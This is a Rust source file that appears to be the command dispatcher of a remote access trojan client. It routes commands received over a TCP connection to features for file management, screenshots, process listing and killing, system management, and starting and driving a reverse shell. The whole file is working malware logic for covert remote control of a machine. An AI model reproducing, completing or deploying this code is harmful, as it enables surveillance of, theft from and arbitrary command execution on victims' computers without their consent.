use std::sync::{Arc, Mutex};
use std::net::TcpStream;
use std::path::PathBuf;
use std::process::Child;

use crate::features::reverse_shell::{start_shell, exit_shell, execute_shell_command};
use crate::features::file_manager::file_manager;
use crate::features::system_commands::system_commands;
use crate::features::other::{take_screenshot, client_info};
use crate::features::process::{process_list, kill_process};

pub fn handle_command(write_stream: &mut TcpStream, command: &str, command_data: &str, path: &str, remote_shell: &mut Option<Child>, current_path: &mut PathBuf) {
    match command {
        "FILE_MANAGER" => file_manager(write_stream, current_path, command_data, path),
        // _ if command.starts_with("encryption_request") => encryption_request(write_stream, &command["encryption_request::".len()..]),
        "INIT_CLIENT" => client_info(write_stream),
        "SCREENSHOT" => take_screenshot(write_stream, command_data.parse::<i32>().unwrap()),
        "PROCESS_LIST" => process_list(write_stream),
        "KILL_PROCESS" => kill_process(command_data.parse::<usize>().unwrap()),
        "START_SHELL" => {
            let shared_stream = Arc::new(Mutex::new(write_stream.try_clone().expect("Failed to clone TcpStream")));
            start_shell(shared_stream, remote_shell)
        },
        "EXIT_SHELL" => exit_shell(remote_shell),
        "SHELL_COMMAND" => execute_shell_command(remote_shell, command_data),
        "MANAGE_SYSTEM" => system_commands(command_data),
        _ => {}
    }
}